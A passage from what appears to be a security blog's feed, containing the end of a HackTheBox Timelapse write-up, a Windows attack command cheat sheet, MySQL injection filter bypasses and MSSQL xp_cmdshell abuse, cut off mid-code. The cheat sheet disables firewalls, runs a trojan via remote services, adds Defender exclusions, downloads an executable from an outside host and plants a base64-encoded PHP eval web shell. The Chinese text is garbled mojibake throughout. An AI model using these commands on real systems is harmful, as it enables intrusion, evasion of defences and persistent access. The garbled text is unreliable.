Enabled by default, Enabled groupBUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled groupBUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled groupTIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled groupAuthentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled groupMandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</code></pre><p>The svc_deploy user is a member of the<code>LAPS_Readers</code> group. After some googling, I found that <code>LAPS_Readers</code> group members can read the password of the administrator user</p><pre class="language-none"><code class="language-none">invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock &#123;Get-ADComputer -Identity dc01 -properties * | findstr ms-Mcs-AdmPwd&#125;</code></pre><p>I got the password of administrator!</p><pre class="language-none"><code class="language-none">ms-Mcs-AdmPwd                        : )Vls1+OD0%8WlDdJ6Q)G!4)-ms-Mcs-AdmPwdExpirationTime          : 132943373149524209</code></pre><p>Now, login as administrator!</p><pre class="language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€$ evil-winrm -i <span class="token number">10.10</span>.11.152 -S -u administrator -p <span class="token string">')Vls1+OD0%8WlDdJ6Q)G!4)-'</span>                                                                       <span class="token number">130</span> â¨¯Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machineData: For <span class="token function">more</span> information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>timelapse<span class="token punctuation">\</span>administrator</code></pre><p>Get root.txt in <code>c:\users\TRX\desktop\root.txt</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windwos å‘½ä»¤å¤‡å¿˜å½•</title>
      <link href="/posts/cfde7db2.html"/>
      <url>/posts/cfde7db2.html</url>
      
        <content type="html"><![CDATA[<h1 id="netsh-å…³é—­é˜²ç«å¢™"><a href="#netsh-å…³é—­é˜²ç«å¢™" class="headerlink" title="netsh å…³é—­é˜²ç«å¢™"></a>netsh å…³é—­é˜²ç«å¢™</h1><pre class="language-none"><code class="language-none">netsh advfilewall set publicprofile state offnetsh advfirewall set allprofiles state off</code></pre><h1 id="netsh-ç«¯å£è½¬å‘"><a href="#netsh-ç«¯å£è½¬å‘" class="headerlink" title="netsh ç«¯å£è½¬å‘"></a>netsh ç«¯å£è½¬å‘</h1><pre class="language-none"><code class="language-none"># å¼€å¯è½¬å‘netsh interface portproxy add v4tov4 listenaddress&#x3D;LOCAL_ADDRESS listenport&#x3D;LOCAL_PORT connectaddress&#x3D;DEST_ADDRESS connectport&#x3D;DEST_PORT# æŸ¥çœ‹å­˜åœ¨çš„è½¬å‘netsh interface portproxy show all# åˆ é™¤æŒ‡å®šè§„åˆ™netsh interface portproxy delete v4tov4 listenport&#x3D;LOCAL_PORT listenaddress&#x3D;LOCAL_ADDRESS</code></pre><h1 id="sc-åˆ›å»ºæœåŠ¡"><a href="#sc-åˆ›å»ºæœåŠ¡" class="headerlink" title="sc åˆ›å»ºæœåŠ¡"></a>sc åˆ›å»ºæœåŠ¡</h1><p>åŸºæœ¬ç”¨æ³•</p><pre class="language-none"><code class="language-none">sc create &lt;SERVICE_NAME&gt; binpath&#x3D; &quot;&lt;COMMEND&gt;&quot;sc description &lt;SERVICE_NAME&gt;   &quot;DESCRIPTION&quot; è®¾ç½®æœåŠ¡çš„æè¿°å­—ç¬¦ä¸² sc config &lt;SERVICE_NAME&gt;   start&#x3D; auto  è®¾ç½®è¿™ä¸ªæœåŠ¡ä¸ºè‡ªåŠ¨å¯åŠ¨ net start &lt;SERVICE_NAME&gt;   å¯åŠ¨æœåŠ¡</code></pre><p>å¯ä»¥é€šè¿‡ IPC è¿æ¥åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºæœåŠ¡</p><pre class="language-none"><code class="language-none"># å…³é—­åŸŸæ§é˜²ç«å¢™sc \\\\DC create wall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;sc \\\\DC start wall# æ‰§è¡Œæœ¨é©¬sc \\\\DC create shell binpath&#x3D; &quot;c:\\shell.exe&quot;sc \\\\DC start shell</code></pre><h1 id="å¼€å…³-3389-ç«¯å£"><a href="#å¼€å…³-3389-ç«¯å£" class="headerlink" title="å¼€å…³ 3389 ç«¯å£"></a>å¼€å…³ 3389 ç«¯å£</h1><pre class="language-none"><code class="language-none"># å¼€å¯REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f# å…³é—­REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</code></pre><h1 id="å¼€å…³-RDP"><a href="#å¼€å…³-RDP" class="headerlink" title="å¼€å…³ RDP"></a>å¼€å…³ RDP</h1><pre class="language-none"><code class="language-none"># å¼€å¯wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1# å…³é—­wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 0</code></pre><h1 id="é”å±"><a href="#é”å±" class="headerlink" title="é”å±"></a>é”å±</h1><pre class="language-none"><code class="language-none">Rundll32.exe user32.dllï¼ŒLockWorkStation</code></pre><h1 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h1><pre class="language-none"><code class="language-none">certutil.exe -urlcache -split -f [URL] output.file# base64è§£ç certutil.exe -decode encode.file decode.file</code></pre><h1 id="æŸ¥è¯¢-defender-ç™½åå•è·¯å¾„"><a href="#æŸ¥è¯¢-defender-ç™½åå•è·¯å¾„" class="headerlink" title="æŸ¥è¯¢ defender ç™½åå•è·¯å¾„"></a>æŸ¥è¯¢ defender ç™½åå•è·¯å¾„</h1><pre class="language-none"><code class="language-none">reg query &quot;HKLM\SOFTWARE\Microsoft\windows Defender\Exclusions\Paths&quot;</code></pre><h1 id="ä¿®æ”¹-defender-ç™½åå•"><a href="#ä¿®æ”¹-defender-ç™½åå•" class="headerlink" title="ä¿®æ”¹ defender ç™½åå•"></a>ä¿®æ”¹ defender ç™½åå•</h1><pre class="language-none"><code class="language-none">Add-MpPreference -ExclusionPath &quot;C:\Utils&quot; # æ·»åŠ ç™½åå•è·¯å¾„Add-MpPreference -ExclusionExtension &quot;C:\Utils\veil.exe&quot; # æ·»åŠ ç™½åå•ç¨‹åº</code></pre><h1 id="PowerShell-ä¸‹è½½è¿œç¨‹æ–‡ä»¶"><a href="#PowerShell-ä¸‹è½½è¿œç¨‹æ–‡ä»¶" class="headerlink" title="PowerShell ä¸‹è½½è¿œç¨‹æ–‡ä»¶"></a>PowerShell ä¸‹è½½è¿œç¨‹æ–‡ä»¶</h1><pre class="language-none"><code class="language-none">powershell (new-object Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.93.100:8000&#x2F;win.exe&#39;,&#39;C:\win.exe&#39;)</code></pre><h1 id="æ›¿æ¢æ–‡ä»¶ä¸­éƒ¨åˆ†å†…å®¹å¹¶å†™å…¥åˆ°åŸæ–‡ä»¶"><a href="#æ›¿æ¢æ–‡ä»¶ä¸­éƒ¨åˆ†å†…å®¹å¹¶å†™å…¥åˆ°åŸæ–‡ä»¶" class="headerlink" title="æ›¿æ¢æ–‡ä»¶ä¸­éƒ¨åˆ†å†…å®¹å¹¶å†™å…¥åˆ°åŸæ–‡ä»¶"></a>æ›¿æ¢æ–‡ä»¶ä¸­éƒ¨åˆ†å†…å®¹å¹¶å†™å…¥åˆ°åŸæ–‡ä»¶</h1><pre class="language-none"><code class="language-none">powershell ((cat C:\Users\administrator\Desktop\info.txt) -replace &#39;somethings&#39;, &#39;anothor things&#39;) | set-content -path C:\Users\administrator\Desktop\info.txt</code></pre><h1 id="PowerShell-ä¸­ä½¿ç”¨å…¶ä»–ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤"><a href="#PowerShell-ä¸­ä½¿ç”¨å…¶ä»–ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤" class="headerlink" title="PowerShell ä¸­ä½¿ç”¨å…¶ä»–ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤"></a>PowerShell ä¸­ä½¿ç”¨å…¶ä»–ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤</h1><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$passwd</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token string">"PASSWORD"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token variable">$cred</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token punctuation">(</span><span class="token string">"DOMAIN\USERNAME"</span><span class="token punctuation">,</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token comment"># æ‰§è¡Œå‘½ä»¤</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>computername localhost <span class="token punctuation">[</span><span class="token operator">-</span>ConfigurationName dc_manage<span class="token punctuation">]</span> <span class="token operator">-</span>credential <span class="token variable">$cred</span> <span class="token operator">-</span>command <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>ComputerName localhost <span class="token operator">-</span>Credential <span class="token variable">$cred</span> <span class="token operator">-</span>ScriptBlock <span class="token punctuation">&#123;</span>whoami<span class="token punctuation">&#125;</span></code></pre><h1 id="æŸ¥æ‰¾æŒ‡å®šæ–‡ä»¶"><a href="#æŸ¥æ‰¾æŒ‡å®šæ–‡ä»¶" class="headerlink" title="æŸ¥æ‰¾æŒ‡å®šæ–‡ä»¶"></a>æŸ¥æ‰¾æŒ‡å®šæ–‡ä»¶</h1><p>é€’å½’æŸ¥è¯¢ C ç›˜ä¸‹ index.html æ–‡ä»¶è·¯å¾„</p><pre class="language-none"><code class="language-none">dir &#x2F;s &#x2F;b c:\index.html</code></pre><p>å¯¹æ— å›æ˜¾ RCE çš„ web æœºå™¨å¯ä»¥é€šè¿‡é…åˆè¯¥å‘½ä»¤å°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œè¾¾åˆ°åŠå›æ˜¾æ•ˆæœ</p><p>å†™å…¥å‘½ä»¤æ‰§è¡Œç»“æœ</p><pre class="language-none"><code class="language-none">for &#x2F;f %i in (&quot;dir &#x2F;s &#x2F;b c:\index.html&quot;) do (whoami &gt; %i\..\whoami.txt)</code></pre><p>å†™å…¥ä¸€å¥è¯é©¬</p><pre class="language-none"><code class="language-none">for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\1.jpg&#39;) do (echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA&#x2F;Pgo&#x3D; &gt; %i\..\base64.txt)for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b c:\base64.txt&#39;) do (certutil.exe -decode %i\..\base64.txt %i\..\1.php)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL å…³é”®å­—è¿‡æ»¤ Bypass</title>
      <link href="/posts/53b8e68.html"/>
      <url>/posts/53b8e68.html</url>
      
        <content type="html"><![CDATA[<h1 id="è¿‡æ»¤-information-schema"><a href="#è¿‡æ»¤-information-schema" class="headerlink" title="è¿‡æ»¤ information_schema"></a>è¿‡æ»¤ information_schema</h1><p>åœ¨ mysql 5.7 ä¸­æ–°å¢äº† sys.schema,åŸºç¡€æ•°æ®æ¥è‡ªäº performance_chema å’Œ information_schema ä¸¤ä¸ªåº“ï¼Œæœ¬èº«æ•°æ®åº“ä¸å­˜å‚¨æ•°æ®</p><h2 id="sys-schema-auto-increment-columns"><a href="#sys-schema-auto-increment-columns" class="headerlink" title="sys.schema_auto_increment_columns"></a>sys.schema_auto_increment_columns</h2><p>å­˜åœ¨è‡ªå¢å­—æ®µæ—¶å¯ä»¥ä½¿ç”¨ <code>sys.schema_auto_increment_columns</code> è·å–è¡¨å</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> sys<span class="token punctuation">.</span>schema_auto_increment_columns <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="sys-schema-table-statistics-with-buffer"><a href="#sys-schema-table-statistics-with-buffer" class="headerlink" title="sys.schema_table_statistics_with_buffer"></a>sys.schema_table_statistics_with_buffer</h2><p>æ²¡æœ‰è‡ªå¢å­—æ®µæ—¶å¯ä»¥ä½¿ç”¨ <code>sys.schema_table_statistics_with_buffer</code> è·å–è¡¨å</p><pre class="language-sql" data-language="sql"><code class="language-sql">elect table_name <span class="token keyword">from</span> sys<span class="token punctuation">.</span>schema_table_statistics_with_buffer <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="è·å–å­—æ®µå"><a href="#è·å–å­—æ®µå" class="headerlink" title="è·å–å­—æ®µå"></a>è·å–å­—æ®µå</h2><p>ä½¿ç”¨ <code>join .. using</code> è·å–å­—æ®µå</p><p><code>select * from (select * from users as a join users as b)as c;</code></p><p>æŠ¥é”™ä¸­å¯ä»¥å¾—åˆ°ç¬¬ä¸€ä¸ªå­—æ®µå</p><p><code>ERROR 1060 (42S21): Duplicate column name &#39;uid&#39;</code></p><p>å°† <code>uid</code> åŠ å…¥åˆ° using ä¸­</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">as</span> a <span class="token keyword">join</span> users <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">as</span> a <span class="token keyword">join</span> users <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>uid<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h2 id="é™åˆ¶"><a href="#é™åˆ¶" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h2><p>MYSQL ç‰ˆæœ¬å¤§äº 5.7ï¼Œroot æƒé™</p><h1 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h1><p>ä½¿ç”¨å­æŸ¥è¯¢å¯ä»¥åœ¨ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹è·å–æ•°æ®</p><p>æ³¨æ„ç‚¹</p><ul><li>è¦æŸ¥è¯¢çš„åˆ—éœ€è¦ç”¨ `` æ¥åŒ…è£¹</li><li>éœ€è¦çŸ¥é“è¡¨ä¸­æœ‰å¤šå°‘åˆ—</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># admin è¡¨å­˜åœ¨</span><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span class="token comment"># ` è¢«è¿‡æ»¤æ—¶ä½¿ç”¨åˆ«åä»£æ›¿</span><span class="token keyword">select</span> b <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">as</span> b <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span class="token comment"># æŸ¥è¯¢å¤šåˆ—</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token identifier"><span class="token punctuation">`</span>3<span class="token punctuation">`</span></span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> admin<span class="token punctuation">)</span>a <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span></code></pre><h1 id="è¿‡æ»¤ç©ºæ ¼"><a href="#è¿‡æ»¤ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼"></a>è¿‡æ»¤ç©ºæ ¼</h1><ul><li>ä½¿ç”¨æ³¨é‡Šç»•è¿‡ï¼Œ<code>/**/</code>ï¼Œ<code>/*!*/</code></li><li>ä½¿ç”¨æ‹¬å·ç»•è¿‡ï¼Œæ‹¬å·å¯ä»¥ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢ï¼Œä»»ä½•è®¡ç®—ç»“æœçš„è¯­å¥éƒ½å¯ä»¥ä½¿ç”¨ <code>()</code> åŒ…å›´ï¼Œå¹¶ä¸”ä¸¤ç«¯å¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼</li><li>ä½¿ç”¨å…¶ä»–ç©ºç™½ç¬¦æ›¿ä»£ç©ºæ ¼ï¼Œ<code>%20%09%0d %0b %0c %0d %a0%0a</code></li></ul><h1 id="è¿‡æ»¤é€—å·"><a href="#è¿‡æ»¤é€—å·" class="headerlink" title="è¿‡æ»¤é€—å·"></a>è¿‡æ»¤é€—å·</h1><p>ä½¿ç”¨ join ç»•è¿‡</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">JOIN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">4</span><span class="token punctuation">)</span>d<span class="token punctuation">)</span></code></pre><p>limit çš„å¦ä¸€ç§å†™æ³•ï¼š<code>limit M offset N</code>ï¼Œç­‰ä»·äº <code>limit M, N</code></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/">https://drops.blbana.cc/2017/05/20/SQLi-%E2%80%94%E2%80%94-%E9%80%97%E5%8F%B7%EF%BC%8C%E7%A9%BA%E6%A0%BC%EF%BC%8C%E5%AD%97%E6%AE%B5%E5%90%8D%E8%BF%87%E6%BB%A4%E7%AA%81%E7%A0%B4/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MYSQL </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL ä¸€èˆ¬åˆ©ç”¨æ–¹å¼</title>
      <link href="/posts/5beaca16.html"/>
      <url>/posts/5beaca16.html</url>
      
        <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>SQL Server æ˜¯ Microsoft å¼€å‘çš„å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆRDBMSï¼‰ã€‚ å®ƒæ˜¯å¸‚åœºä¸Šæœ€å—æ¬¢è¿çš„ DBMS ä¹‹ä¸€ã€‚SQL Server å…·æœ‰æå…¶å¹¿æ³›çš„ç”¨é€”ï¼Œå®ƒå¯ä»¥åœ¨å„ä¸ªæ–¹é¢ä½¿ç”¨,ä»å­˜å‚¨ä¸ªäººåšå®¢çš„å†…å®¹åˆ°å­˜å‚¨å®¢æˆ·æ•°æ®ç­‰</p><p>åœ¨ 2017 ç‰ˆä¹‹å‰ï¼ŒSQL Server ä»…é€‚ç”¨äº Windowsã€‚ SQL Server 2017 ä¸­æœ€å¤§çš„å˜åŒ–ä¹‹ä¸€æ˜¯ï¼Œå®ƒç°åœ¨å¯åœ¨ Linux å’Œ Docker å®¹å™¨ä¸Šä½¿ç”¨ã€‚ è¿™æ„å‘³ç€å¯ä»¥åœ¨ Mac ä¸Šè¿è¡Œ SQL Server</p><h1 id="å±é™©çš„å­˜å‚¨è¿‡ç¨‹"><a href="#å±é™©çš„å­˜å‚¨è¿‡ç¨‹" class="headerlink" title="å±é™©çš„å­˜å‚¨è¿‡ç¨‹"></a>å±é™©çš„å­˜å‚¨è¿‡ç¨‹</h1><h2 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h2><h3 id="æŸ¥è¯¢-xp-cmdshell-å­˜å‚¨è¿‡ç¨‹æ˜¯å¦å­˜åœ¨"><a href="#æŸ¥è¯¢-xp-cmdshell-å­˜å‚¨è¿‡ç¨‹æ˜¯å¦å­˜åœ¨" class="headerlink" title="æŸ¥è¯¢ xp_cmdshell å­˜å‚¨è¿‡ç¨‹æ˜¯å¦å­˜åœ¨"></a>æŸ¥è¯¢ xp_cmdshell å­˜å‚¨è¿‡ç¨‹æ˜¯å¦å­˜åœ¨</h3><p>xtype ä¸ºå¯¹è±¡ç±»å‹ï¼Œxtype&#x3D;â€™xâ€™ï¼Œè¡¨ç¤ºå­˜å‚¨è¿‡ç¨‹çš„å¯¹è±¡ç±»å‹ä¸ºæ‰©å±•å­˜å‚¨è¿‡ç¨‹</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysobjects <span class="token keyword">where</span> xtype<span class="token operator">=</span><span class="token string">'x'</span> <span class="token operator">and</span> name<span class="token operator">=</span><span class="token string">'xp_cmdshell'</span> <span class="token comment"># å­˜åœ¨åˆ™è¿”å› 1</span></code></pre><h3 id="xp-cmdshell-çš„å¼€å¯ä¸å…³é—­"><a href="#xp-cmdshell-çš„å¼€å¯ä¸å…³é—­" class="headerlink" title="xp_cmdshell çš„å¼€å¯ä¸å…³é—­"></a>xp_cmdshell çš„å¼€å¯ä¸å…³é—­</h3><p>å¼€å¯</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre><p>å…³é—­</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span></code></pre><h3 id="æ¢å¤-xp-cmdshell-å­˜å‚¨è¿‡ç¨‹"><a href="#æ¢å¤-xp-cmdshell-å­˜å‚¨è¿‡ç¨‹" class="headerlink" title="æ¢å¤ xp_cmdshell å­˜å‚¨è¿‡ç¨‹"></a>æ¢å¤ xp_cmdshell å­˜å‚¨è¿‡ç¨‹</h3><p>Error Message: æœªèƒ½æ‰¾åˆ°å­˜å‚¨è¿‡ç¨‹ â€˜master..xp_cmdshellâ€™ï¼Œå³ xp_cmdshell è¢«åˆ é™¤ï¼Œæ¢å¤æ–¹å¼å¦‚ä¸‹</p><p>ç¬¬ä¸€æ­¥åˆ é™¤</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_addextendedproc<span class="token keyword">drop</span> <span class="token keyword">procedure</span> sp_oacreate<span class="token keyword">exec</span> sp_dropextendedproc <span class="token string">'xp_cmdshell'</span></code></pre><p>ç¬¬äºŒæ­¥æ¢å¤</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"sp_oacreate"</span><span class="token punctuation">,</span><span class="token string">"odsole70.dll"</span><span class="token punctuation">)</span><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre><p>ä¸Šä¼  xplog70.dllï¼Œæ¢å¤æ‰©å±•å­˜å‚¨è¿‡è¿‡ç¨‹ xp_cmdshell</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">dbcc</span> addextendedproc<span class="token punctuation">(</span><span class="token string">"xp_cmdshell"</span><span class="token punctuation">,</span><span class="token string">"xplog70.dll"</span><span class="token punctuation">)</span></code></pre><h2 id="æ³¨å†Œè¡¨ç›¸å…³æ“ä½œ"><a href="#æ³¨å†Œè¡¨ç›¸å…³æ“ä½œ" class="headerlink" title="æ³¨å†Œè¡¨ç›¸å…³æ“ä½œ"></a>æ³¨å†Œè¡¨ç›¸å…³æ“ä½œ</h2><p>SQL Server å­˜åœ¨ä¸€ç³»åˆ—çš„å­˜å‚¨è¿‡ç¨‹ï¼Œå¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œå¢åˆ æ”¹æŸ¥ã€‚xp_regreadã€xp_regwriteã€xp_regdeletvalueã€xp_regdeletkeyã€xp_regaddmultistring ç­‰</p><h3 id="xp-regread-è¯»æ³¨å†Œè¡¨"><a href="#xp-regread-è¯»æ³¨å†Œè¡¨" class="headerlink" title="xp_regread è¯»æ³¨å†Œè¡¨"></a>xp_regread è¯»æ³¨å†Œè¡¨</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> xp_regread <span class="token string">'HKEY_current_user'</span><span class="token punctuation">,</span><span class="token string">'Control Panel\International'</span><span class="token punctuation">,</span><span class="token string">'sCountry'</span><span class="token comment"># exec xp_regread [é”®], [å­é”®], [é”®å€¼]</span><span class="token keyword">exec</span> xp_regread N<span class="token string">'HKEY_LOCAL_MACHINE'</span><span class="token punctuation">,</span> N<span class="token string">'SYSTEM\CurrentControlSet\Services\MSSEARCH'</span> <span class="token 